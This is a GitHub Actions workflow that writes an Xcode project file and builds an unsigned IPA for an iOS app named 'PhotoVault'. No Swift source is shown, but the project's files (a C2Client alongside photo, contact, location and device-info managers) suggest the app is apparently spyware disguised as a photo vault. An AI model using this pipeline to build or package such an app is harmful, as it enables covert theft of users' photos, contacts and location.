name: Build PhotoVault IPA

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: macos-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Select Xcode
      run: sudo xcode-select -s /Applications/Xcode_16.0.app/Contents/Developer || sudo xcode-select -s /Applications/Xcode.app/Contents/Developer
    
    - name: Create Xcode Project
      run: |
        cd ios
        mkdir -p PhotoVault.xcodeproj
        
        # Generate project.pbxproj
        cat > PhotoVault.xcodeproj/project.pbxproj << 'PBXPROJ'
        // !$*UTF8*$!
        {
          archiveVersion = 1;
          classes = {};
          objectVersion = 56;
          objects = {
            /* Begin PBXBuildFile section */
            A1000001 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1000001; };
            A1000002 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1000002; };
            A1000003 /* C2Client.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1000003; };
            A1000004 /* PhotoManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1000004; };
            A1000005 /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1000005; };
            A1000006 /* LocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1000006; };
            A1000007 /* DeviceInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1000007; };
            A1000008 /* VaultViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1000008; };
            /* End PBXBuildFile section */

            /* Begin PBXFileReference section */
            B1000001 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
            B1000002 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
            B1000003 /* C2Client.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = C2Client.swift; sourceTree = "<group>"; };
            B1000004 /* PhotoManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoManager.swift; sourceTree = "<group>"; };
            B1000005 /* ContactManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactManager.swift; sourceTree = "<group>"; };
            B1000006 /* LocationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationManager.swift; sourceTree = "<group>"; };
            B1000007 /* DeviceInfo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceInfo.swift; sourceTree = "<group>"; };
            B1000008 /* VaultViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VaultViewController.swift; sourceTree = "<group>"; };
            B1000009 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
            B1000010 /* PhotoVault.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PhotoVault.app; sourceTree = BUILT_PRODUCTS_DIR; };
            /* End PBXFileReference section */

            /* Begin PBXGroup section */
            C1000001 /* Main Group */ = {
              isa = PBXGroup;
              children = (
                C1000002 /* PhotoVault */,
                C1000003 /* Products */,
              );
              sourceTree = "<group>";
            };
            C1000002 /* PhotoVault */ = {
              isa = PBXGroup;
              children = (
                B1000001 /* AppDelegate.swift */,
                B1000002 /* SceneDelegate.swift */,
                B1000003 /* C2Client.swift */,
                B1000004 /* PhotoManager.swift */,
                B1000005 /* ContactManager.swift */,
                B1000006 /* LocationManager.swift */,
                B1000007 /* DeviceInfo.swift */,
                B1000008 /* VaultViewController.swift */,
                B1000009 /* Info.plist */,
              );
              path = PhotoVault;
              sourceTree = "<group>";
            };
            C1000003 /* Products */ = {
              isa = PBXGroup;
              children = (
                B1000010 /* PhotoVault.app */,
              );
              name = Products;
              sourceTree = "<group>";
            };
            /* End PBXGroup section */

            /* Begin PBXNativeTarget section */
            D1000001 /* PhotoVault */ = {
              isa = PBXNativeTarget;
              buildConfigurationList = E1000003;
              buildPhases = (
                D1000002 /* Sources */,
                D1000003 /* Frameworks */,
              );
              buildRules = ();
              dependencies = ();
              name = PhotoVault;
              productName = PhotoVault;
              productReference = B1000010;
              productType = "com.apple.product-type.application";
            };
            /* End PBXNativeTarget section */

            /* Begin PBXProject section */
            D1000004 /* Project object */ = {
              isa = PBXProject;
              attributes = {
                BuildIndependentTargetsInParallel = 1;
                LastSwiftUpdateCheck = 1600;
                LastUpgradeCheck = 1600;
              };
              buildConfigurationList = E1000001;
              compatibilityVersion = "Xcode 14.0";
              developmentRegion = en;
              hasScannedForEncodings = 0;
              knownRegions = (en, Base);
              mainGroup = C1000001;
              productRefGroup = C1000003;
              projectDirPath = "";
              projectRoot = "";
              targets = (
                D1000001 /* PhotoVault */,
              );
            };
            /* End PBXProject section */

            /* Begin PBXSourcesBuildPhase section */
            D1000002 /* Sources */ = {
              isa = PBXSourcesBuildPhase;
              buildActionMask = 2147483647;
              files = (
                A1000001,
                A1000002,
                A1000003,
                A1000004,
                A1000005,
                A1000006,
                A1000007,
                A1000008,
              );
              runOnlyForDeploymentPostprocessing = 0;
            };
            /* End PBXSourcesBuildPhase section */

            /* Begin PBXFrameworksBuildPhase section */
            D1000003 /* Frameworks */ = {
              isa = PBXFrameworksBuildPhase;
              buildActionMask = 2147483647;
              files = ();
              runOnlyForDeploymentPostprocessing = 0;
            };
            /* End PBXFrameworksBuildPhase section */

            /* Begin XCBuildConfiguration section */
            E1000004 /* Debug */ = {
              isa = XCBuildConfiguration;
              buildSettings = {
                ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
                CODE_SIGN_IDENTITY = "-";
                CODE_SIGN_STYLE = Automatic;
                CURRENT_PROJECT_VERSION = 1;
                GENERATE_INFOPLIST_FILE = NO;
                INFOPLIST_FILE = PhotoVault/Info.plist;
                IPHONEOS_DEPLOYMENT_TARGET = 16.0;
                LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
                MARKETING_VERSION = 1.0;
                PRODUCT_BUNDLE_IDENTIFIER = com.photovault.app;
                PRODUCT_NAME = "$(TARGET_NAME)";
                SWIFT_VERSION = 5.0;
                TARGETED_DEVICE_FAMILY = "1,2";
              };
              name = Debug;
            };
            E1000005 /* Release */ = {
              isa = XCBuildConfiguration;
              buildSettings = {
                ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
                CODE_SIGN_IDENTITY = "-";
                CODE_SIGN_STYLE = Automatic;
                CURRENT_PROJECT_VERSION = 1;
                GENERATE_INFOPLIST_FILE = NO;
                INFOPLIST_FILE = PhotoVault/Info.plist;
                IPHONEOS_DEPLOYMENT_TARGET = 16.0;
                LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
                MARKETING_VERSION = 1.0;
                PRODUCT_BUNDLE_IDENTIFIER = com.photovault.app;
                PRODUCT_NAME = "$(TARGET_NAME)";
                SWIFT_COMPILATION_MODE = wholemodule;
                SWIFT_OPTIMIZATION_LEVEL = "-O";
                SWIFT_VERSION = 5.0;
                TARGETED_DEVICE_FAMILY = "1,2";
              };
              name = Release;
            };
            E1000006 /* Debug */ = {
              isa = XCBuildConfiguration;
              buildSettings = {
                ALWAYS_SEARCH_USER_PATHS = NO;
                CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
                CLANG_ENABLE_MODULES = YES;
                CLANG_ENABLE_OBJC_ARC = YES;
                COPY_PHASE_STRIP = NO;
                DEBUG_INFORMATION_FORMAT = dwarf;
                ENABLE_STRICT_OBJC_MSGSEND = YES;
                ENABLE_TESTABILITY = YES;
                GCC_DYNAMIC_NO_PIC = NO;
                GCC_OPTIMIZATION_LEVEL = 0;
                GCC_PREPROCESSOR_DEFINITIONS = "DEBUG=1 $(inherited)";
                IPHONEOS_DEPLOYMENT_TARGET = 16.0;
                MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
                ONLY_ACTIVE_ARCH = YES;
                SDKROOT = iphoneos;
                SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
                SWIFT_OPTIMIZATION_LEVEL = "-Onone";
              };
              name = Debug;
            };
            E1000007 /* Release */ = {
              isa = XCBuildConfiguration;
              buildSettings = {
                ALWAYS_SEARCH_USER_PATHS = NO;
                CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
                CLANG_ENABLE_MODULES = YES;
                CLANG_ENABLE_OBJC_ARC = YES;
                COPY_PHASE_STRIP = NO;
                DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
                ENABLE_NS_ASSERTIONS = NO;
                ENABLE_STRICT_OBJC_MSGSEND = YES;
                GCC_OPTIMIZATION_LEVEL = s;
                IPHONEOS_DEPLOYMENT_TARGET = 16.0;
                MTL_ENABLE_DEBUG_INFO = NO;
                SDKROOT = iphoneos;
                SWIFT_COMPILATION_MODE = wholemodule;
                SWIFT_OPTIMIZATION_LEVEL = "-O";
                VALIDATE_PRODUCT = YES;
              };
              name = Release;
            };
            /* End XCBuildConfiguration section */

            /* Begin XCConfigurationList section */
            E1000001 /* Build configuration list for PBXProject */ = {
              isa = XCConfigurationList;
              buildConfigurations = (
                E1000006,
                E1000007,
              );
              defaultConfigurationIsVisible = 0;
              defaultConfigurationName = Release;
            };
            E1000003 /* Build configuration list for PBXNativeTarget */ = {
              isa = XCConfigurationList;
              buildConfigurations = (
                E1000004,
                E1000005,
              );
              defaultConfigurationIsVisible = 0;
              defaultConfigurationName = Release;
            };
            /* End XCConfigurationList section */
          };
          rootObject = D1000004;
        }
        PBXPROJ

    - name: Build for iOS Simulator (no signing required)
      run: |
        cd ios
        xcodebuild build \
          -project PhotoVault.xcodeproj \
          -scheme PhotoVault \
          -sdk iphonesimulator \
          -destination 'generic/platform=iOS Simulator' \
          -configuration Release \
          CODE_SIGN_IDENTITY="-" \
          CODE_SIGNING_REQUIRED=NO \
          CODE_SIGNING_ALLOWED=NO \
          ONLY_ACTIVE_ARCH=NO \
          2>&1 | tail -50

    - name: Build unsigned IPA
      run: |
        cd ios
        
        # Build the .app for generic iOS device (arm64)
        xcodebuild build \
          -project PhotoVault.xcodeproj \
          -scheme PhotoVault \
          -sdk iphoneos \
          -destination 'generic/platform=iOS' \
          -configuration Release \
          -derivedDataPath ./build \
          CODE_SIGN_IDENTITY="" \
          CODE_SIGNING_REQUIRED=NO \
          CODE_SIGNING_ALLOWED=NO \
          2>&1 | tail -30
        
        # Package as IPA
        APP_PATH=$(find ./build -name "PhotoVault.app" -type d | head -1)
        if [ -z "$APP_PATH" ]; then
          echo "ERROR: PhotoVault.app not found"
          find ./build -name "*.app" -type d
          exit 1
        fi
        
        echo "Found app at: $APP_PATH"
        
        mkdir -p Payload
        cp -r "$APP_PATH" Payload/
        zip -r PhotoVault.ipa Payload/
        rm -rf Payload
        
        echo "IPA created successfully"
        ls -la PhotoVault.ipa

    - name: Upload IPA
      uses: actions/upload-artifact@v4
      with:
        name: PhotoVault-unsigned
        path: ios/PhotoVault.ipa
        retention-days: 30
